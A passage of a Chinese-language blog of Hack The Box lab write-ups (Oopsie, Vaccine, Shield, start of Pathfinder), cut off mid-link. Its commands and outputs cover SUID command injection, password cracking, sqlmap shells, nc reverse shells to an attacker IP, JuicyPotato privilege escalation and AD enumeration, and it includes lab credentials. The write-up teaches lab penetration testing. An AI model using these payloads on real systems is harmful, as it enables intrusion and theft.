class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/cdn-cgi/login/db.php</span><br><span class="line"></span><br><span class="line">&lt;i/login$ cat cat /var/www/html/cdn-cgi/login/db.php</span><br><span class="line">cat: cat: No such file or directory</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;robert&#x27;</span>,<span class="string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="string">&#x27;garage&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>得到账户信息<code>robert:M3g4C0rpUs3r!</code></p><p>使用该账户信息切换到用户<code>robert</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su robert</span><br><span class="line">M3g4C0rpUs3r!</span><br><span class="line">cat /home/robert/user.txt</span><br><span class="line"></span><br><span class="line">f2c74ee8db7983851ab2a96a44eb7981</span><br></pre></td></tr></table></figure><p>查找有SUID权限的文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>看到一个有意思的文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bugtracker</span><br></pre></td></tr></table></figure><p>而该用户也有运行权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/bin/bugtracker</span><br><span class="line">-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)</span><br></pre></td></tr></table></figure><p>IDA中分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__uid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;\n------------------\n: EV Bug Tracker :\n------------------\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Provide Bug ID: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;---------------\n\n&quot;</span>);</span><br><span class="line">  v3 = geteuid();</span><br><span class="line">  setuid(v3);</span><br><span class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)concat(<span class="string">&quot;cat /root/reports/&quot;</span>, v7);</span><br><span class="line">  system(v4);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>用户输入<code>v7</code></li><li><code>v7</code>被拼接到&quot;cat /root/reports/&quot;之后在赋值给<code>v4</code></li><li>执行<code>v4</code></li></ul><p>命令注入</p><p>Payload: <code>;cat$IFS$9/root/root.txt</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./bugtracker</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line">: EV Bug Tracker :</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Provide Bug ID: ;cat$IFS<span class="variable">$9</span>/root/root.txt</span><br><span class="line">---------------</span><br><span class="line"></span><br><span class="line">cat: /root/reports/: Is a directory</span><br><span class="line">af13b0bee69f8a877c3faf667f7beacf</span><br></pre></td></tr></table></figure><hr /><h1 id="archetype-2"><a class="markdownIt-Anchor" href="#archetype-2"></a> Archetype</h1><p>Linux</p><h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.46</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.46</span><br><span class="line">Host is up (0.59s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2><blockquote><p>The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server. – 官方WP</p></blockquote><blockquote><p>尝试使用上台靶机中获取的ftp凭据ftpuser/mc@F1l3ZilL4登录靶机的ftp服务<br /><a href="https://blog.csdn.net/qianxiaoyiran311/article/details/105988795">https://blog.csdn.net/qianxiaoyiran311/article/details/105988795</a></p></blockquote><p>得到FTP账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftpuser:mc@F1l3ZilL4</span><br></pre></td></tr></table></figure><p>登入FTP服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.10.46</span><br><span class="line">Connected to 10.10.10.46.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.10.10.46:root): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get backup.zip</span><br><span class="line"><span class="built_in">local</span>: backup.zip remote: backup.zip</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> backup.zip (2533 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">2533 bytes received <span class="keyword">in</span> 0.23 secs (10.7549 kB/s)</span><br></pre></td></tr></table></figure><p>爆破加密压缩包<code>backup.zip</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip backup.zip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u</span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw &#x3D;&#x3D; 741852963</span><br></pre></td></tr></table></figure><p>查看<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      header(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>爆破Hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span> &gt; passwd</span><br><span class="line">john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passwd</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-MD5 [MD5 256/256 AVX2 8x3])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=2</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">qwerty789        (?)</span><br><span class="line">1g 0:00:00:00 DONE (2021-06-05 19:16) 33.33g/s 3340Kp/s 3340Kc/s 3340KC/s shunda..pogimo</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-MD5&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session complete</span><br></pre></td></tr></table></figure><p>登入Web页面, 看到一个搜索功能<br />使用sqlmap来getshell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.46/dashboard.php?search=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure><p>sqlmap给出的shell不是很好用, 自己再弹个Shell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.51 9996 &gt;/tmp/y</span><br><span class="line">------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure><h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2><p>查看数据库信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/dashboard.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = pg_connect(<span class="string">&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;</span>);</span><br></pre></td></tr></table></figure><p>得到账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres:P@s5w0rd!</span><br></pre></td></tr></table></figure><p>SSH登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh postgres@10.10.10.46</span><br><span class="line">P@s5w0rd!</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> postgres: P@s5w0rd!</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> postgres on vaccine:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User postgres may run the following commands on vaccine:</span><br><span class="line">    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br></pre></td></tr></table></figure><p>vi提权</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br><span class="line">dd6e058e814260bc70e9bbdef2715849</span><br></pre></td></tr></table></figure><hr /><blockquote><p>来自上一台靶机的FTP账户</p></blockquote><p>本着实践出真知的精神, 再看了一下上一台靶机<strong>Oopsie</strong>的端口开放情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1205/mysqld         </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      800/systemd-resolve </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1120/sshd           </span><br><span class="line">tcp        0    235 10.10.10.28:41042       10.10.16.51:9996        ESTABLISHED 2166/python3        </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      1260/apache2        </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      1120/sshd           </span><br><span class="line">tcp6       0      0 10.10.10.28:80          10.10.16.51:58936       ESTABLISHED 1963/apache2</span><br></pre></td></tr></table></figure><p>并没有FTP服务, 那么就是可能这种靶机顺序关系的变更</p><p>我个人不是很认同这种把敏感信息放在其他靶机泄露的设计<br />确切来说, <strong>不应该把这种通过其他靶机泄露敏感信息作为唯一的攻击链</strong><br />在给出这样的一条攻击链的时候应该再给出另外一个攻击链<br />虽然这样的确能够对于连续的靶机渗透, 或者说多层靶机渗透的带来更加贯通的体验<br />但是出现了这种顺序变更的情况之后就会显得十分弄巧成拙, 而且没有应有的后续修改<br />没有<strong>user.txt</strong>也只是给这台机器的2.7分锦上添花了</p><hr /><h1 id="shield"><a class="markdownIt-Anchor" href="#shield"></a> Shield</h1><p>Windows</p><h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.29</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.29</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="路径扫描"><a class="markdownIt-Anchor" href="#路径扫描"></a> 路径扫描</h2><p>扫描到路径<code>/wordpress</code><br /><s>其实根本没扫, 网络环境太差了, 直接看WP的</s></p><h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.10.29/wordpress/ -e u</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://10.10.10.29/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>使用上一台靶机的密码<code>P@s5w0rd!</code><br />得到账户<code>admin:P@s5w0rd!</code><br /><s>拳头硬了</s></p><p>登入之后修改插件的代码<br />直接写个Shell进去<br />然后访问<code>/wordpress/wp-content/plugins/mesmerize-companion/src/Companion.php</code>即可</p><h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2><p>蚁剑连WebShell<br />上传nc再弹Shell回来</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc64.exe -e C:\windows\system32\cmd.exe 10.10.16.51 9996</span><br><span class="line">-------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">Host Name:                 SHIELD</span><br><span class="line">OS Name:                   Microsoft Windows Server 2016 Standard</span><br><span class="line">OS Version:                10.0.14393 N/A Build 14393</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Member Server</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows User</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00376-30000-00299-AA303</span><br><span class="line">Original Install Date:     2/4/2020, 12:58:01 PM</span><br><span class="line">System Boot Time:          6/5/2021, 8:21:33 PM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume2</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     2,047 MB</span><br><span class="line">Available Physical Memory: 753 MB</span><br><span class="line">Virtual Memory: Max Size:  2,431 MB</span><br><span class="line">Virtual Memory: Available: 1,015 MB</span><br><span class="line">Virtual Memory: In Use:    1,416 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    MEGACORP.LOCAL</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0 2</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.10.29</span><br><span class="line">                                 [02]: fe80::98f9:2cd0:ff27:3fbc</span><br><span class="line">                                 [03]: dead:beef::98f9:2cd0:ff27:3fbc</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required <span class="keyword">for</span> Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure><p>没有打补丁的Windows Server 2016 Standard<br />用烂土豆提权<br /><a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</a></p><p>写一个反弹Shell的bat脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> start C:\temp\nc64.exe -e cmd.exe 10.10.16.51 9995 &gt; C:\temp\shell.bat</span><br></pre></td></tr></table></figure><p>当时因为用linux的习惯就用了双引号把要写入的内容括了起来, 但是Windows会很蛋疼得把双引号也写入, 然后就导致了当时一直不能提权</p><p>看一下权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name          Description                               State  </span><br><span class="line">======================= ========================================= =======</span><br><span class="line">SeChangeNotifyPrivilege Bypass traverse checking                  Enabled</span><br><span class="line">SeImpersonatePrivilege  Impersonate a client after authentication Enabled</span><br><span class="line">SeCreateGlobalPrivilege Create global objects                     Enabled</span><br></pre></td></tr></table></figure><blockquote><p>如果开启SeImpersonate权限，juicypotato的参数可以使用-t t<br />如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u<br />如果均开启，可以选择-t *<br />如果均未开启，那么无法提权<br /><a href="https://blog.csdn.net/god_zzZ/article/details/106334702">https://blog.csdn.net/god_zzZ/article/details/106334702</a></p></blockquote><p>然后在项目上找一个Windows Server 2016 Standard的CLSID</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p C:\temp\shell.bat -l 6666 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;</span><br><span class="line">------</span><br><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">6e9a9fdc6f64e410a68b847bb4b404fa</span><br></pre></td></tr></table></figure><hr /><h1 id="pathfinder"><a class="markdownIt-Anchor" href="#pathfinder"></a> Pathfinder</h1><p>对于域控的攻击有点超出的我的知识范围了</p><h2 id="端口扫描-5"><a class="markdownIt-Anchor" href="#端口扫描-5"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -p 1-10000 10.10.10.30</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.30</span><br><span class="line">Host is up (0.57s latency).</span><br><span class="line">Not shown: 9987 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-08 13:22:07Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><blockquote><p>使用上一台靶机的凭证<code>sandra:Password1234!</code>来枚举AD的信息 – 官方WP</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d megacorp.local -u sandra -p <span class="string">&quot;Password1234!&quot;</span> -gc pathfinder.megacorp.local -c all -ns 10.10.10.30</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure><p>json打包为zip后放进bloodhound<br />自己用在kali用bloodhound的时候总是莫名其妙的崩溃, 只能在windows上使用了<br />需要改一下neo4j所监听的ip, 默认是监听本地环回, 需要改成一个windows上能够访问到的ip</p><p>通过分析<code>Find Principals with DCSync Rights</code><br />可以看到用户SVC_BES有权限<code>GetChanges</code>&amp;<code>GetchangesAll</code></p><blockquote><p>“With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz”<br /><a 